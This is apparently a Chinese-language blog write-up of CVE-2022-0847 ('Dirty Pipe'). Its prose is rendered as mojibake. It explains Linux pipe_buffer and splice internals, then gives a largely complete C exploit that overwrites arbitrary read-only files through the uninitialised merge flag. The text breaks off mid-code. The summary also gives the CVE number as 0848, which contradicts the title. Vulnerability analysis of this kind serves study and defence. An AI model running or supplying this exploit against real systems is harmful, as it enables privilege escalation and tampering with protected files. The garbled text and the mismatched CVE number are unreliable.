---
layout: post
title: CVE-2022-0847: \"dirty pipe\" å˜é‡æœªåˆå§‹åŒ–å¼•å‘çš„è¶Šæƒå†™æ–‡ä»¶
category: CVE
date: 2025-3-10 12:00:00
---
è„è„çš„ç®¡é“ï¼Œç ´ç ´çš„exp
<!-- more -->


[toc]

# CVE-2022-0847: "dirty pipe" å˜é‡æœªåˆå§‹åŒ–å¼•å‘çš„è¶Šæƒå†™æ–‡ä»¶

## 0x00. æ€»ç»“

- `CVE`ç¼–å·ï¼š`CVE-2022-0848`
- å—å½±å“`linux`ç‰ˆæœ¬ï¼š`5.8 ~ 5.16.11, 5.15.25 and 5.10.102`
- æˆå› ï¼š`splice`

## 0x01. pipe åŸºç¡€çŸ¥è¯†

### pipe ç³»ç»Ÿè°ƒç”¨ - åˆ›å»º pipe

åœ¨ç”¨æˆ·æ€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºç®¡é“æ¥å®ç°è¿›ç¨‹é—´é€šä¿¡ã€‚å½“åœ¨ç”¨æˆ·æ€ä¸‹è°ƒç”¨`pipe`æ—¶ï¼Œä¼šç»è¿‡å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨ï¼š

```c
SYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)
{
	return do_pipe2(fildes, flags);
}

SYSCALL_DEFINE1(pipe, int __user *, fildes)
{
	return do_pipe2(fildes, 0);
}
```

å…¶ä¸­ï¼Œæ ¹æ®`pipe`ç³»ç»Ÿè°ƒç”¨è¿˜æ˜¯`pipe2`ç³»ç»Ÿè°ƒç”¨ï¼Œä¼šå†³å®šæ˜¯å¦åœ¨`do_pipe2`å‡½æ•°è°ƒç”¨æ—¶æ·»åŠ `flags`ï¼Œæ­¤å¤–æ²¡æœ‰åŒºåˆ«ã€‚`pipe2`ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶è¯´çš„â€œæœ‰åç®¡é“â€ï¼Œè€Œ`pipe`åˆ™æ˜¯â€œåŒ¿åç®¡é“â€ï¼Œæˆ‘ä»¬æ­¤å¤„ä¸»è¦å…³æ³¨`pipe`ç›¸å…³ã€‚

è·Ÿè¿›ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥å¾—åˆ°å…¶å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š

```c 
do_pipe2() // è¿”å›ç»™ç”¨æˆ·
    __do_pipe_flags() // è·å– read å’Œ write çš„æ–‡ä»¶æè¿°ç¬¦
    	create_pipe_files() // å¯¹ä¸‹å±‚è°ƒç”¨å¾—åˆ°çš„ inode è¿›è¡Œå±æ€§é…ç½®
    		get_pipe_inode() // å¯¹ä¸‹å±‚è°ƒç”¨å¾—åˆ°çš„ pipe_inode_info ç»“æ„ä½“è¿›è¡Œé…ç½®
    			alloc_pipe_info() // æ ¸å¿ƒéƒ¨åˆ†
```

æˆ‘ä»¬åˆ†æ`alloc_pipe_info`éƒ¨åˆ†ï¼Œå…¶æºç å¦‚ä¸‹æ‰€ç¤ºï¼š

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
	struct pipe_inode_info *pipe;
	unsigned long pipe_bufs = PIPE_DEF_BUFFERS;
	struct user_struct *user = get_current_user();
	unsigned long user_bufs;
	unsigned int max_size = READ_ONCE(pipe_max_size);
	
    // åˆ†é… pipe_inode_info ç»“æ„ä½“ï¼Œåˆ†é…æ ‡å¿—ä¸º GFP_KERNEL_ACCOUNTï¼Œå¤§å°ä¸€èˆ¬ä¸º0x88
	pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);
	if (pipe == NULL)
		goto out_free_uid;
	
    // pipe_bufsçš„å¤§å°å·²ç»å¤§äºå½“å‰çš„æœ€å¤§å¤§å°
	if (pipe_bufs * PAGE_SIZE > max_size && !capable(CAP_SYS_RESOURCE))
		pipe_bufs = max_size >> PAGE_SHIFT;

	user_bufs = account_pipe_buffers(user, 0, pipe_bufs);

	if (too_many_pipe_buffers_soft(user_bufs) && pipe_is_unprivileged_user()) {
		user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);
		pipe_bufs = PIPE_MIN_DEF_BUFFERS;
	}
	
    // ç”¨æˆ·ä½¿ç”¨çš„bufé¡µå·²ç»å¤ªå¤š
	if (too_many_pipe_buffers_hard(user_bufs) && pipe_is_unprivileged_user())
		goto out_revert_acct;
	
    // ç”³è¯·pipe_bufferç»“æ„ä½“ï¼Œåˆ†é…æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNT
    // é»˜è®¤æƒ…å†µä¸‹ç”³è¯·16ä¸ª0x28çš„pipe_bufferç»“æ„ä½“ï¼Œå› æ­¤é»˜è®¤ä¸ºkmalloc-0x400(kmalloc-1024)
	pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
			     GFP_KERNEL_ACCOUNT);
	
    // åˆ›å»ºæˆåŠŸåˆ™åˆå§‹åŒ–
	if (pipe->bufs) {
		init_waitqueue_head(&pipe->rd_wait);
		init_waitqueue_head(&pipe->wr_wait);
		pipe->r_counter = pipe->w_counter = 1;
		pipe->max_usage = pipe_bufs;
		pipe->ring_size = pipe_bufs;
		pipe->nr_accounted = pipe_bufs;
		pipe->user = user;
		mutex_init(&pipe->mutex);
		return pipe;
	}

out_revert_acct:
	(void) account_pipe_buffers(user, pipe_bufs, 0);
	kfree(pipe);
out_free_uid:
	free_uid(user);
	return NULL;
}
```

èƒ½çœ‹åˆ°ä¸`pipe`ç›¸å…³çš„ä¸¤ä¸ªæœ€é‡è¦çš„ç»“æ„ä½“ä¸º`pipe_inode_info`å’Œ`pipe_buffer`ï¼Œå…¶ä¸­ï¼šï¼ˆç›´æ¥ç”¨äº†`breeeze`å¸ˆå‚…çš„æ³¨é‡Šï¼‰ï¼š

```c
struct pipe_inode_info {
	struct mutex mutex;
	wait_queue_head_t rd_wait, wr_wait;
	unsigned int head; //pipe_buffer å¾ªç¯é˜Ÿåˆ—çš„å¤´ä¸‹æ ‡
	unsigned int tail; //pipe_buffer å¾ªç¯é˜Ÿåˆ—çš„å°¾ä¸‹æ ‡
	unsigned int max_usage; //ç®¡é“ä¸­å…è®¸å­˜åœ¨çš„çš„æœ€å¤§å­—èŠ‚æ•°
	unsigned int ring_size; //pipe_buffer å¾ªç¯é˜Ÿåˆ—çš„é•¿åº¦
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss;
#endif
	unsigned int nr_accounted;
	unsigned int readers; //è¯»å–è¿™ä¸ªç®¡é“çš„ç”¨æˆ·æ•°é‡
	unsigned int writers; //å‘è¿™ä¸ªç®¡é“å†™çš„ç”¨æˆ·æ•°é‡
	unsigned int files;
	unsigned int r_counter;
	unsigned int w_counter;
	struct page *tmp_page; // ä¸´æ—¶ page
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	struct pipe_buffer *bufs;// æŒ‡å‘16ä¸ªpipe_buffer ç»“æ„ä½“
	struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue;
#endif
};
```

å¯ä»¥çœ‹åˆ°å…¶ç®¡ç†äº†`16`ä¸ª`pipe_buffer`ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼‰ã€‚è€Œè¿™äº›`pipe_buffer`åˆ™ç»„æˆäº†ä¸€ä¸ªå¾ªç¯é˜Ÿåˆ—ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imageseb0d46d46274ff0fbe6cdad5a9e2cd6a.png)

å…¶ä¸­`pipe->head`æŒ‡å‘ç”¨æˆ·`write`çš„åœ°æ–¹ï¼Œè€Œ`pipe->tail`åˆ™æŒ‡å‘ç”¨æˆ·`read`çš„åœ°æ–¹ï¼ŒæŒ‡é’ˆéƒ½æ˜¯ä¸æ–­å¢é•¿çš„ã€‚

å…¶ä¸­ï¼Œè¯»å†™æ“ä½œå‘ç”Ÿåœ¨`pipe_buffer`æŒ‡å‘çš„`page`ä¸­ï¼Œ`pipe_buffer`çš„å®šä¹‰å¦‚ä¸‹ï¼š

```c
struct pipe_buffer {
	struct page *page; //æ¯ä¸ªpipe_buffer ç»“æ„ä½“ç®¡ç†ä¸€ä¸ªé¡µ
	unsigned int offset, len; //è®°å½•åç§»å’Œé•¿åº¦
	const struct pipe_buf_operations *ops;//opsï¼ŒæŒ‡å‘å†…æ ¸ä¸­çš„å…¨å±€å¸¸é‡
    //flagæ˜¯é¡µä½¿ç”¨çš„æ ‡å¿—ä½ï¼Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯PIPE_BUF_FLAG_CAN_MERGE ä»£è¡¨è¯¥é¡µæ˜¯å¦å¯ä»¥ç»­å†™
	unsigned int flags; 
	unsigned long private;
};
```

å…¶é™¤äº†æŒ‡å‘`page`ç»“æ„ä½“ï¼Œå³ç”¨æ¥è¯»å†™æ•°æ®çš„ç¼“å­˜åŒºåŸŸå¤–ï¼Œè¿˜åŒ…å«å½“å‰`buffer`çš„åç§»å’Œé•¿åº¦ã€‚è€Œ`ops`æ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œå…¶æŒ‡å‘ä¸€ä¸ªå‡½æ•°è¡¨ï¼Œæ¥è§¦è¿‡`linux kernel pwn`çš„åŒå­¦åº”è¯¥å¹¶ä¸é™Œç”Ÿï¼Œå…¶å¯ä»¥è¢«è¦†ç›–åç”¨äºåŠ«æŒç¨‹åºæ§åˆ¶æµã€‚

è€Œè¿˜æœ‰ä¸€ä¸ªæ ‡å¿—ä½`flags`ï¼Œå…¶ä¸­è¡¨ç¤ºå½“å‰æŒ‡å‘çš„ç¼“å†²åŒºçš„ä¸€äº›å±æ€§ï¼Œå…¶ä¸­`PIPE_BUF_FLAG_CAN_MERGE`å±æ€§æ˜¯ä»Šå¤©çš„ä¸»è§’ï¼Œè¡¨ç¤ºå½“å‰é¡µæ˜¯å¦å¯ä»¥ç»­å†™ã€‚æ­¤å¤„å…ˆæŒ‰ä¸‹ä¸è¡¨ã€‚

æ€»çš„æ¥è¯´ï¼Œæˆ‘ä»¬äº†è§£åˆ°ï¼š

- ç”¨æˆ·æ€è°ƒç”¨`pipe`åˆ›å»ºç®¡é“æ—¶ï¼Œä¼šå¾—åˆ°ä¸€ä¸ª`pipe_inode_info`ç»“æ„ä½“è¡¨ç¤ºå½“å‰ç®¡é“çš„åŸºæœ¬ä¿¡æ¯ï¼Œä»¥åŠ`16`ä¸ª`pipe_buffer`ç»“æ„ä½“ï¼Œå…¶æœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„`page`æŒ‡é’ˆï¼Œä»¥åŠå½“å‰ç¼“å†²åŒºçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚
- `16`ä¸ª`pipe_buffer`ç»“æ„ä½“ç»„æˆä¸€ä¸ªç¯å½¢é˜Ÿåˆ—ï¼Œå…¶ä¸­`pipe_inode_info`ä¸­çš„`head`å’Œ`tail`åˆ†åˆ«è®°å½•å…¶æŒ‡å‘çš„å†™å’Œè¯»çš„åŒºåŸŸã€‚

### pipe ç³»ç»Ÿè°ƒç”¨ - write å†™

å½“æˆ‘ä»¬è°ƒç”¨`write`å‘`pipe`ä¸­å†™æ•°æ®æ—¶ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ°`pipe_write`ï¼Œå…¶ä¸»è¦é€»è¾‘éƒ¨åˆ†å¦‚ä¸‹ï¼š

```c
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	unsigned int head;
	ssize_t ret = 0;
	size_t total_len = iov_iter_count(from);
	ssize_t chars;
	bool was_empty = false;
	bool wake_next_writer = false;

	/* Null write succeeds. */
	if (unlikely(total_len == 0))
		return 0;
	...

	head = pipe->head; // è·å–åˆ°å½“å‰çš„å†™æŒ‡é’ˆ
	was_empty = pipe_empty(head, pipe->tail); // å½“å‰çš„pageæ˜¯å¦ä¸ºç©º
	chars = total_len & (PAGE_SIZE-1); // è®¡ç®—å¾—åˆ°ç”¨æˆ·å†™çš„ä¸è¶…è¿‡ä¸€é¡µçš„é•¿åº¦
    
    // è‹¥å†™æŒ‡é’ˆæŒ‡å‘çš„é¡µä¸ä¸ºç©ºï¼Œä¸”ç”¨æˆ·æœ‰æ•°æ®å†™ï¼Œåˆ™è€ƒè™‘æ˜¯å¦å¯ä»¥åœ¨å½“å‰é¡µç»­å†™
	if (chars && !was_empty) {
		unsigned int mask = pipe->ring_size - 1;
		struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];
		int offset = buf->offset + buf->len;
		
        // è‹¥å½“å‰é¡µé¢è®¾ç½®äº†PIPE_BUF_FLAG_CAN_MERGEå±æ€§ï¼Œåˆ™å¯ä»¥ç»­å†™ï¼Œåˆ™è¿›å…¥è¯¥åˆ†æ”¯
        // è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶æ˜¯ä¸èƒ½å†™å¾—è¶…è¿‡ä¸€é¡µ
		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;
			
            // è°ƒç”¨copy_page_from_iterç»­å†™å†…å®¹åˆ°å½“å‰çš„page
			ret = copy_page_from_iter(buf->page, offset, chars, from);
			if (unlikely(ret < chars)) {
				ret = -EFAULT;
				goto out;
			}

			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}
	
    // ä¸èƒ½ç»­å†™ï¼Œæˆ–è€…æ˜¯åç»­å†…å®¹ï¼Œæ­£å¸¸å†™
	for (;;) {
		if (!pipe->readers) {
			send_sig(SIGPIPE, current, 0);
			if (!ret)
				ret = -EPIPE;
			break;
		}
	
        // ç®¡é“æ²¡æ»¡
		head = pipe->head;
		if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
			unsigned int mask = pipe->ring_size - 1;
			struct pipe_buffer *buf = &pipe->bufs[head & mask];
			struct page *page = pipe->tmp_page; // pipeçš„ä¸´æ—¶é¡µ
			int copied;
			
            // è‹¥æ²¡æœ‰ä¸´æ—¶é¡µï¼Œåˆ›å»ºä¸€ä¸ªæ–°é¡µä½œä¸ºä¸´æ—¶é¡µ
			if (!page) {
				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
				if (unlikely(!page)) {
					ret = ret ? : -ENOMEM;
					break;
				}
				pipe->tmp_page = page;
			}

			/* Allocate a slot in the ring in advance and attach an
			 * empty buffer.  If we fault or otherwise fail to use
			 * it, either the reader will consume it or it'll still
			 * be there for the next write.
			 */
			spin_lock_irq(&pipe->rd_wait.lock);
			
			head = pipe->head;
			if (pipe_full(head, pipe->tail, pipe->max_usage)) {
				spin_unlock_irq(&pipe->rd_wait.lock);
				continue;
			}

			pipe->head = head + 1;
			spin_unlock_irq(&pipe->rd_wait.lock);

			/* Insert it into the buffer array */
			buf = &pipe->bufs[head & mask];
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = 0;
			if (is_packetized(filp)) // é»˜è®¤ä¸ä¼šè¿›å…¥
				buf->flags = PIPE_BUF_FLAG_PACKET;
			else
				buf->flags = PIPE_BUF_FLAG_CAN_MERGE; // é¡µé¢é»˜è®¤ä¼šè®¾ç½®PIPE_BUF_FLAG_CAN_MERGEï¼Œå³å¯ç»­å†™
			pipe->tmp_page = NULL;
			
            // è°ƒç”¨copy_page_from_iteræ¥å†™å†…å®¹
			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
			if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {
				if (!ret)
					ret = -EFAULT;
				break;
			}
			ret += copied;
			buf->offset = 0;
			buf->len = copied;

			if (!iov_iter_count(from))
				break;
		}

		...
	return ret;
}
```

ä¸Šé¢ä»£ç éƒ¨åˆ†ä¸º`pipe_write`ä¸»è¦çš„å†™é€»è¾‘ï¼Œå…¶ä¸­ï¼š

- æ¯ä¸ªè¦å†™çš„`pipe_buffer`çš„é¡µé¢é»˜è®¤éƒ½è®¾ç½®ä¸º`PIPE_BUF_FLAG_CAN_MERGE`ï¼Œå³å¯ä»¥ç»­å†™
- å†æ¬¡å†™å…¥æ—¶ï¼Œè‹¥å¯ä»¥ç»­å†™çš„é¡µé¢ä¸ä¸ºç©ºï¼Œä¸”è¶³å¤Ÿå®¹çº³ç”¨æˆ·æ•°æ®ï¼Œåˆ™åœ¨ç»­å†™çš„é¡µé¢è¿›è¡Œç»­å†™

## 0x02. splice â€œé›¶æ‹·è´â€ åŸºç¡€çŸ¥è¯†

`splice`èƒ½å¤Ÿåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œå…¶å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š

```c
ssize_t splice(int fd_in, loff_t *off_in, 
               int fd_out, loff_t *off_out, 
               size_t len, unsigned int flags);
```

å…¶ä¸­åˆ†åˆ«å¯ä»¥æŒ‡å®šè¾“å…¥è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦å’Œåç§»ï¼Œä»¥åŠé•¿åº¦ã€æ ‡å¿—ä½ã€‚è¿™ä¸éš¾è®©æˆ‘ä»¬æƒ³åˆ°`sendfile`ç³»ç»Ÿè°ƒç”¨ã€‚ä½†`splice`ç³»ç»Ÿè°ƒç”¨æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š

- é€‚ç”¨äºç®¡é“ï¼š`splice`åªèƒ½åœ¨è‡³å°‘æœ‰ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯ç®¡é“çš„æƒ…å†µä¸‹æ‰èƒ½ä½¿ç”¨ã€‚
- é›¶æ‹·è´ï¼šæ•°æ®ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ä¼ è¾“ï¼Œæ— éœ€æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œæå‡æ•ˆç‡ã€‚

å¯¹äº"é›¶æ‹·è´"ï¼Œè¯•æƒ³åœºæ™¯å¦‚ä¸‹ï¼š

```c
read(3, buf, 0x20);
write(pipe_fd[1], buf, 0x20);
```

å¯ä»¥çœ‹åˆ°è¯¥è¿‡ç¨‹éœ€è¦å°†æ•°æ®å…ˆè¯»å–åˆ°ç”¨æˆ·æ€ä¸‹çš„`buf`å˜é‡ä¸­ã€‚ä½¿ç”¨é›¶æ‹·è´çš„`splice`åˆ™è§„é¿äº†è¿™ä¸€ç‚¹ï¼Œæå‡äº†æ•ˆç‡ã€‚

è€Œ`splice`å®ç°çš„åŸç†å¦‚ä¸‹ï¼š

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesdeeb0c847eab0eb87353837f39bc3542.png)

å³ï¼Œ`splice`ç›´æ¥å°†æ‰“å¼€çš„æ–‡ä»¶æ˜ å°„çš„`page`ç›´æ¥æ”¾åˆ°`pipe`çš„ç¼“å­˜é¡µä¸­ã€‚

è¿™æ˜¯å› ä¸ºåœ¨`linux`å†…æ ¸ä¸­ï¼Œä¸ºäº†æå‡æ•ˆç‡ï¼Œç¼“å­˜çš„é¡µä¼šä¿å­˜ä¸€æ®µæ—¶é—´ï¼Œæœ€è¿‘è‹¥å†æœ‰è®¿é—®åˆ°è¯¥é¡µçš„æ—¶åˆ™å¯ä»¥é¿å…ä¸å¿…è¦çš„`IO`æ“ä½œã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨`splice`é›¶æ‹·è´æ—¶ï¼Œå…¶åŸç†å°±æ˜¯å°†æ‰“å¼€çš„æ–‡ä»¶çš„é¡µçš„ç¼“å­˜é¡µé¢ç›´æ¥æŒ‚å…¥`pipe`çš„é¡µé¢ä¸­ï¼Œè‹¥å…¶ä¸Šæœ‰è¯»å†™æ“ä½œåˆ™ç›´æ¥å¯¹è¯¥é¡µé¢è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯ä½¿ç”¨`pipe`æœ¬èº«çš„`page`è¿›è¡Œä¸€ä¸ªä¸­é—´çš„è¿‡æ¸¡ã€‚

ä»æºç è§’åº¦åˆ†æä¸€ä¸‹ï¼Œå…¶å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š

```c
__do_splice()
    do_splice()
    	...
    		copy_page_to_iter_pipe() // ä¸»è¦è¿‡ç¨‹
```

è¿™æ®µä»£ç å¦‚ä¸‹ï¼š

```c
// linux kernel 5.16.10 /lib/iov_iter.c:384
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
	unsigned int p_tail = pipe->tail;
	unsigned int p_mask = pipe->ring_size - 1;
	unsigned int i_head = i->head;
	size_t off;
	
	if (unlikely(bytes > i->count))
		bytes = i->count;
	
    // ä¼ å…¥çš„å€¼ä¸æ˜¯0å­—èŠ‚
	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;
	
	off = i->iov_offset; // åç§»ï¼Œè®¾ç½®ä¸º0ä¸è¿›å…¥åˆ†æ”¯å³å¯
	buf = &pipe->bufs[i_head & p_mask]; // buf ä¸ºå½“å‰ head çš„ pipe_buffer
	if (off) {
		if (offset == off && buf->page == page) {
			/* merge with the last one */
			buf->len += bytes;
			i->iov_offset += bytes;
			goto out;
		}
		i_head++;
		buf = &pipe->bufs[i_head & p_mask];
	}
    // ç®¡é“ä¸èƒ½æ»¡
	if (pipe_full(i_head, p_tail, pipe->max_usage))
		return 0;
	
    // bufçš„opså†™ä¸ºæ–‡ä»¶é¡µçš„ops
	buf->ops = &page_cache_pipe_buf_ops;
	get_page(page); // ä¸»è¦æ˜¯è®©pageçš„_countçš„å€¼ï¼ˆå¼•ç”¨è®¡æ•°ï¼Ÿï¼‰åŠ ä¸€ï¼Œé¿å…è¯¥pageè¢«å†…æ ¸ç›´æ¥é‡Šæ”¾æ‰
	buf->page = page; // pipe_bufferçš„pageç°åœ¨æŒ‡å‘æ–‡ä»¶ç¼“å­˜é¡µçš„page
	buf->offset = offset;
	buf->len = bytes;

	pipe->head = i_head + 1;
	i->iov_offset = offset + bytes;
	i->head = i_head;
out:
	i->count -= bytes;
	return bytes;
}
```

## 0x03. æ¼æ´æˆå› 

ä¸Šé¢å·²ç»æåˆ°`splice`çš„åŸç†ã€‚è€Œ`splice`è°ƒç”¨çš„`copy_page_to_iter_pipe`å‡½æ•°ä¸­ï¼š

```c
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf->ops = &page_cache_pipe_buf_ops;
	// buf->flags = 0; // ä¿®å¤çš„æ—¶å€™æ‰åŠ ä¸Šçš„
 	get_page(page);
 	buf->page = page;
 	buf->offset = offset;
```

å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰å¯¹æ”¹å…¥åçš„`pipe_buffer`ç»“æ„ä½“ä¸­çš„`flags`åˆå§‹åŒ–æ¥æ¸…ç©ºã€‚

å› æ­¤ï¼Œè‹¥åŸæœ¬`pipe_buffer`ç»“æ„ä½“ä¸­`flags`æ ‡å¿—ä½å¸¦æœ‰`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ï¼Œåˆ™ä¸ä¼šè¢«æ¸…ç©ºã€‚

æ­¤æ—¶è‹¥å†å¯¹`pipe`è°ƒç”¨ä¸€æ¬¡`write`æ¥å†™æ•°æ®ï¼Œåˆ™ä¼šè¿›å…¥å¦‚ä¸‹åˆ†æ”¯ï¼š

```c
head = pipe->head; // ç°åœ¨æ–°çš„headæŒ‡å‘æŒ‚å…¥çš„æ–‡ä»¶ç¼“å­˜é¡µ
was_empty = pipe_empty(head, pipe->tail); // ä¸ä¸ºç©º
chars = total_len & (PAGE_SIZE-1); // å†™å…¥çš„æ•°æ®ï¼Œä¸ä¼šä¸º0
if (chars && !was_empty) {
    unsigned int mask = pipe->ring_size - 1;
    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];
    int offset = buf->offset + buf->len;
	
    // æ˜¯å¦æœ‰è¯¥å±æ€§ï¼Œæˆ‘ä»¬é€šè¿‡è¯»å†™ä¸€æ•´ä¸ªç®¡é“åå·²ç»å¸¦æœ‰è¯¥å±æ€§ã€‚æŒ‚å…¥æ–‡ä»¶é¡µåå¹¶æ²¡æœ‰æ¸…ç©ºã€‚
    // å› æ­¤è¿›å…¥è¯¥åˆ†æ”¯è¿›è¡Œç»­å†™
    if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
        offset + chars <= PAGE_SIZE) {
        ret = pipe_buf_confirm(pipe, buf);
        if (ret)
            goto out;
		
        // å†™å†…å®¹ï¼Œé€ æˆè¶Šæƒå†™
        ret = copy_page_from_iter(buf->page, offset, chars, from);
        if (unlikely(ret < chars)) {
            ret = -EFAULT;
            goto out;
        }

        buf->len += ret;
        if (!iov_iter_count(from))
            goto out;
    }
}
```

## 0x04. æ¼æ´åˆ©ç”¨ï¼šç¼–å†™poc

æŒ‰ç…§ä¸Šè¿°æ¼æ´æ¥ç¼–å†™`exp`ï¼Œå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š

- æ‰“å¼€å¾…è¦†å†™æ–‡ä»¶ï¼Œä»è€Œè®©æ–‡ä»¶çš„ç¼“å­˜é¡µç•™åœ¨å†…å­˜ä¸­
- å»ºç«‹ç®¡é“ï¼Œè®¡ç®—ç®¡é“çš„å¤§å°ï¼Œå‘ç®¡é“å†™æ•°æ®å¡«æ»¡ç®¡é“
- ä»ç®¡é“è¯»æ•°æ®æ¸…ç©ºç®¡é“ï¼Œæ­¤æ—¶æ¯ä¸€ä¸ªç®¡é“ä¸­çš„`pipe_buffer`éƒ½è¢«å†™ä¸Šäº†`PIPE_BUF_FLAG_CAN_MERGE`ä½
- è°ƒç”¨`splice`é›¶æ‹·è´ï¼Œä»è€Œå°†æ–‡ä»¶çš„ç¼“å­˜é¡µæŒ‚å…¥`pipe_buffer`ï¼Œä½†`flag`æœªæ¸…ç©º
- å†æ¬¡å‘ç®¡é“å†™æ•°æ®ï¼Œè§¦å‘æ¼æ´ï¼Œå‘æ–‡ä»¶ç¼“å­˜é¡µè¿›è¡Œç»­å†™

```c
#include "ltfallkernel.h"
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        error("Usage: %s [TARGET_FILE] [OFFSET] [DATA].", argv[0]);
        exit(0);
    }

    int pipe_fd[2];

    const char *const path = argv[1];
    size_t offset = strtoul(argv[2], NULL, 0);
    const char *const data = argv[3];
    const size_t data_size = strlen(data);

    /* dirty pipe å†™å…¥æ–‡ä»¶ä¸èƒ½ä»ç¬¬ä¸€å­—èŠ‚å¼€å§‹ï¼Œå‡†ç¡®çš„è¯´æ˜¯æ¯ä¸ªé¡µçš„ç¬¬ä¸€å­—èŠ‚å¼€å§‹ */
    if (offset % PAGE_SIZE == 0)
    {
        err_exit("Writing at a page boundary is NOT ALLOWED.");
    }

    /* dirty pipe ä¸èƒ½è·¨é¡µå†™å…¥æ–‡ä»¶ */
    const size_t next_page = (offset | (PAGE_SIZE - 1)) + 1; // è®¡ç®—ä¸‹ä¸€ä¸ªé¡µé¢çš„ä½ç½®
    const size_t end_offset = offset + (size_t)data_size;    // è®¡ç®—æ¬²å†™å…¥çš„ç»“å°¾ä½ç½®
    if (end_offset > next_page)
    {
        err_exit("Writing across a page boundary is NOT ALLOWED.");
    }

    /* æ‰“å¼€æ–‡ä»¶ï¼Œæ£€æŸ¥offsetã€å†™å…¥é•¿åº¦ç­‰åˆæ³•æ€§ */
    const int fd = open(path, O_RDONLY);
    if (fd < 0)
    {
        error("Failed to open the TARGET file: %s.", path);
        exit(0);
    }

    struct stat st;
    if (fstat(fd, &st))
    {
        err_exit("Failed to fstat.");
    }
    if (offset > st.st_size)
    {
        error("Offset %d larger than the file size is NOT ALLOWED.");
        exit(0);
    }
    if (end_offset > st.st_size)
    {
        error("CANNOT enlarge the TARGET file.");
    }

    /* å»ºç«‹ç®¡é“ */
    if (pipe(pipe_fd) < 0)
    {
        err_exit("Failed to create pipe.");
    }

    // é€šè¿‡ fcntl æŸ¥çœ‹ç®¡é“çš„å¤§å°
    const unsigned int pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
    static char buffer[0x1000];


    // å†™ç®¡é“ï¼Œå°†ç®¡é“å¡«æ»¡ï¼Œä»è€Œè®¾ç½®PIPE_BUF_FLAG_CAN_MERGEæ ‡å¿—
    unsigned int r = pipe_size;
    while (r > 0)
    {
        unsigned int n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipe_fd[1], buffer, n);
        r -= n;
    }

    // é€šè¿‡è¯»æ¥æ¸…ç©ºç®¡é“
    r = pipe_size;
    while (r > 0)
    {
        unsigned int n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipe_fd[0], buffer, n);
        r -= n;
    }

    /* ç»è¿‡ä¸Šé¢çš„æ“ä½œï¼Œå¦‚æœæŸä¸ªé¡µé¢è¢«å…³è”åˆ°pipe_bufferï¼Œé‚£è¿™ä¸ªé¡µé¢å°±å¯èƒ½è¢«merge */
    --offset;
    size_t nbytes = splice(fd, &offset, pipe_fd[1], NULL, 1, 0);
    if (nbytes < 0)
    {
        err_exit("splice failed.");
    }

    if(nbytes == 0){
        err_exit("Too short to splice.");
    }

    nbytes = write(pipe_fd[1], data, data_size);
    if(nbytes < 0){
